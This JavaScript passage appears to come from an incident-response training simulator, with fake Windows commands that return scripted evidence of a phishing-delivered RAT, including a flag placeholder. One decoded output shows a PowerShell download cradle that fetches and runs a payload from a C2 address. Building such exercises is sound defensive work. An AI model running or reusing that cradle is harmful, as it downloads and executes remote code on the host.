  dir C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices`;
        },

        // type — display file contents (Windows equivalent of cat)
        'type': function(args, term, engine) {
            const path = (args[0] || '').replace(/\//g, '\\');
            if (!path) return 'Usage: type <filename>';

            // Route to filesystem cat handler
            return D1Config.commands['cat'](args, term, engine);
        },

        // cat — display file contents
        'cat': function(args, term, engine) {
            const rawPath = (args[0] || '').replace(/\//g, '\\').toLowerCase();

            if (rawPath.includes('email_headers') || rawPath.includes('email_head')) {
                return `X-Mailer: The Bat! v9.3.4
X-Originating-IP: 185.220.101.47
Delivered-To: jsmith@meridiancorp.com
Received: from mail.meridian-suppliers.ru (185.220.101.47)
   by mx.meridiancorp.com with ESMTP
   id d9sm2847362pjl.19.2026.03.19.14.28.44
From: "Accounts Payable" <ap@meridian-suppliers.ru>
To: jsmith@meridiancorp.com
Subject: URGENT: Outstanding Invoice #INV-2026-0847 - Action Required
Date: Wed, 19 Mar 2026 14:28:41 +0000
Message-ID: <20260319142841.47823.1@meridian-suppliers.ru>

[Authentication Results]
spf=fail (domain meridian-suppliers.ru does not designate 185.220.101.47 as permitted sender)
dkim=none
dmarc=fail

[Body]
Dear Jessica,

Please find attached our outstanding invoice for March 2026.
Kindly process payment at your earliest convenience.

Best regards,
Accounts Payable
Meridian Suppliers LLC

[Attachment: invoice_march2026.xlsm]

{{FLAG:attacker_email}}`;
            }

            if (rawPath.includes('readme_ir') || rawPath.includes('readme')) {
                return `IR Triage Package — INC-2026-0847
=====================================
Contents:
  svchost32.dmp  - Process memory dump of PID 3412

Capture commands used:
  procdump -ma 3412 C:\\Triage\\svchost32.dmp

Next steps:
  1. Run strings against the dump to find C2 URLs and config data
  2. Look for base64-encoded payloads and decode them
  3. Correlate with network logs (see netstat output)
  4. Hash the dropper: Get-FileHash C:\\Users\\jsmith\\Downloads\\invoice_march2026.xlsm -Algorithm SHA256`;
            }

            if (rawPath.includes('case_notes')) {
                return `=== INCIDENT CASE NOTES — INC-2026-0847 ===
Date: 2026-03-19
Analyst: IR-Analyst
Endpoint: CORP-WS-047
User: jsmith (Jessica Smith, Accounts Payable)

INITIAL REPORT:
- User reports computer "acting weird" at ~15:47
- Intermittent slowness since approximately 14:30
- Observed a command window flash briefly
- No other users on workstation

SOC PRE-TRIAGE:
- Endpoint isolated from lateral network access at 15:48
- Malware process still running
- C2 channel appears active

INVESTIGATION TASKS:
[  ] Identify suspicious processes
[  ] Check network connections
[  ] Analyze memory dump at C:\\Triage\\svchost32.dmp
[  ] Review event logs for initial access vector
[  ] Check Prefetch and execution history
[  ] Find and hash the dropper
[  ] Remove persistence mechanisms
[  ] Generate IOC report`;
            }

            if (rawPath.includes('invoice_march2026') || rawPath.includes('invoice_march')) {
                return `[Excel Macro-Enabled Workbook — binary format]
Cannot display binary content directly.
Use Get-FileHash to compute its hash.
SHA256: A3F8C21E9D4B7A56F082C3E1D9A47B3C2F1E8D5A9C6B4F2E7D1A3C8B5E9F2D4A`;
            }

            if (rawPath.includes('svchost32.exe')) {
                return `[Win32 PE Executable — binary format]
Cannot display binary content directly.
SHA256: B7E4D92A1F3C8B5E9D2A6C4F1E7B3D8A5C9F2E4B1D6A8C3E7F9B2D5A1C4E8F3B
Use strings C:\\Triage\\svchost32.dmp to examine memory contents.`;
            }

            if (rawPath.includes('svchost32.dmp')) {
                return `[Binary memory dump — 47 MB]
Use: strings C:\\Triage\\svchost32.dmp
Use: strings C:\\Triage\\svchost32.dmp | findstr http`;
            }

            if (rawPath.includes('svchost32.exe-4f3a')) {
                return `Prefetch File: SVCHOST32.EXE-4F3A8E21.pf
Process: svchost32.exe
Run Count: 1
Last Run: 2026-03-19 14:32:11
First Run: 2026-03-19 14:32:11

Loaded DLLs (partial):
  C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices\\svchost32.exe
  C:\\Windows\\System32\\ntdll.dll
  C:\\Windows\\System32\\kernel32.dll
  C:\\Windows\\System32\\ws2_32.dll
  C:\\Windows\\System32\\winhttp.dll
  C:\\Windows\\System32\\crypt32.dll
  C:\\Windows\\System32\\advapi32.dll

Note: Loading ws2_32.dll (networking) and winhttp.dll (HTTP) is
not expected for a process named like a Windows service.`;
            }

            return `type: Cannot access '${args[0]}': No such file or directory\nTry: dir <path> to list available files`;
        },

        // whoami — context-aware
        'whoami': function(args) {
            return 'CORP\\IR-Analyst';
        },

        // hostname
        'hostname': function(args) {
            return 'CORP-WS-047';
        },

        // ipconfig — network configuration
        'ipconfig': function(args) {
            return `Windows IP Configuration

Ethernet adapter Ethernet:
   Connection-specific DNS Suffix  . : meridiancorp.com
   IPv4 Address. . . . . . . . . . . : 10.0.1.47
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.1.1

Ethernet adapter vEthernet (IR Toolkit):
   IPv4 Address. . . . . . . . . . . : 172.16.100.2
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.100.1`;
        },

        // wevtutil — event log query
        'wevtutil': function(args) {
            const fullCmd = args.join(' ').toLowerCase();
            if (fullCmd.includes('security') || fullCmd.includes('4688')) {
                return `[Event log query — browse to http://threatintel.local/event-viewer/security for full output]

<Event>
  <System>
    <EventID>4688</EventID>
    <TimeCreated SystemTime="2026-03-19T14:32:07.000Z"/>
    <Computer>CORP-WS-047</Computer>
  </System>
  <EventData>
    <Data Name="NewProcessName">C:\\Users\\jsmith\\Downloads\\invoice_march2026.xlsm</Data>
    <Data Name="ParentProcessName">C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE</Data>
    <Data Name="SubjectUserName">jsmith</Data>
  </EventData>
</Event>

[...and 7 more related events — see Event Viewer for full list]`;
            }
            return 'Usage: wevtutil qe Security /f:text /q:"*[System[EventID=4688]]"\nOr browse to: http://threatintel.local/event-viewer';
        },

        // powershell base64 decode helper
        'certutil': function(args) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('decode') || fullCmd.includes('-decode')) {
                // Decode the payload base64
                if (fullCmd.includes('SQBFAFgA') || fullCmd.includes('payload')) {
                    return `CertUtil: -decode SUCCEEDED

Decoded content:
IEX (New-Object Net.WebClient).DownloadString("http://185.220.101.47:8443/payload")

[!] This is a PowerShell download cradle — downloads and executes the RAT from C2 server`;
                }
                if (fullCmd.includes('V2luZG93c1N5c3RlbUNoZWNr')) {
                    return `CertUtil: -decode SUCCEEDED

Decoded content:
WindowsSystemCheck

[!] This is the scheduled task name used for persistence`;
                }
                return `CertUtil: -decode SUCCEEDED\n[Decoded content depends on input — provide the base64 string from the memory dump]`;
            }
            return 'Usage: certutil -decode <base64string> output.txt\n       certutil -encodehex <file> output.hex';
        },

        // findstr — Windows grep equivalent
        'findstr': function(args) {
            const fullCmd = args.join(' ').toLowerCase();
            if (fullCmd.includes('185.220') || fullCmd.includes('8443')) {
                if (D1Config._firewallRuleAdded) {
                    return `[No active connections to 185.220.101.47 — firewall rule active]`;
                }
                return `  TCP    10.0.1.47:52899        185.220.101.47:8443    ESTABLISHED     3412
  TCP    10.0.1.47:52900        185.220.101.47:8443    ESTABLISHED     3412`;
            }
            return '[findstr — use in pipeline: <command> | findstr <pattern>]';
        },

        // ping — connectivity test
        'ping': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: ping [-n count] destination';
            if (target === '185.220.101.47') {
                if (D1Config._firewallRuleAdded) {
                    return `Pinging 185.220.101.47 with 32 bytes of data:
Request timed out.
Request timed out.
Request timed out.
Request timed out.

Ping statistics for 185.220.101.47:
    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss)

[+] Firewall rule effective — C2 IP is now unreachable`;
                }
                return `Pinging 185.220.101.47 with 32 bytes of data:
Reply from 185.220.101.47: bytes=32 time=184ms TTL=48
Reply from 185.220.101.47: bytes=32 time=181ms TTL=48
Reply from 185.220.101.47: bytes=32 time=183ms TTL=48
Reply from 185.220.101.47: bytes=32 time=182ms TTL=48

Ping statistics for 185.220.101.47:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss)

[!] C2 server is responding — firewall rule not yet applied`;
            }
            if (target === '10.0.1.1' || target === 'localhost' || target === '127.0.0.1') {
                return `Pinging ${target} with 32 bytes of data:
Reply from ${target}: bytes=32 time<1ms TTL=128
Reply from ${target}: bytes=32 time<1ms TTL=128

Ping statistics for ${target}:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss)`;
            }
            return `Ping request could not find host ${target}. Please check the name and try again.`;
        },

        // help command — lists available IR commands
        'help': function(args) {
            return `IR Toolkit — Available Commands
=================================

PROCESS ANALYSIS:
  tasklist [/v]              List running processes (verbose with /v)
  Get-Process [name]         PowerShell process listing
  wmic process list brief    WMI process enumeration
  taskkill /PID <pid> /F     Terminate a process

NETWORK ANALYSIS:
  netstat [-ano]             Active network connections
  ipconfig                   IP configuration
  ping <host>                Connectivity test
  netsh advfirewall ...      Firewall rule management

MEMORY & FILE ANALYSIS:
  strings <file>             Extract readable strings from binary
  Get-FileHash <file>        Compute SHA256/MD5 hash
  dir <path>                 List directory contents
  type <file>                Display file contents
  cat <file>                 Display file contents (alias)
  findstr <pattern>          Search output for pattern

REGISTRY & PERSISTENCE:
  reg query <key>            Query registry key
  reg delete <key> /v <val>  Delete registry value
  schtasks /query [/fo LIST] List scheduled tasks
  schtasks /delete /tn <n>   Delete scheduled task

EVENT LOGS:
  wevtutil qe <log>          Query event log
  [Browser: http://threatintel.local/event-viewer]

HASH DECODING:
  certutil -decode <b64>     Decode base64 string

INVESTIGATION ORDER:
  1. tasklist /v             Find suspicious processes
  2. netstat -ano            Check C2 connections
  3. strings C:\\Triage\\svchost32.dmp | findstr http
  4. dir C:\\Users\\jsmith\\Downloads
  5. Get-FileHash C:\\Users\\jsmith\\Downloads\\invoice_march2026.xlsm -Algorithm SHA256
  6. schtasks /query /fo LIST /v
  7. reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#3498db; border-bottom:2px solid #ddd; background:#f0f4ff;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #eee;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }

};
